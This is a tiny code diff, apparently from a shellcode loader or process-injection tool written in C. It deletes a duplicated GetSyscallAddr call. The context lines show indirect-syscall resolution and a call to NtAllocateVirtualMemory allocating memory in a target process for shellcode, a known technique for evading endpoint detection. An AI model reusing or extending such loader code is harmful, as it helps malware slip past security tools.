@@ -499,7 +499,6 @@ int main(int argc, char** argv)
 	// Indirect Syscall
 	GetSyscall(syscallNum);
 	GetSyscallAddr(syscallAddress);
-	GetSyscallAddr(syscallAddress);
 
 	NTSTATUS status1 = NtAllocateVirtualMemory(hProcess, &BaseAddress, 0, &shellcode_size2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
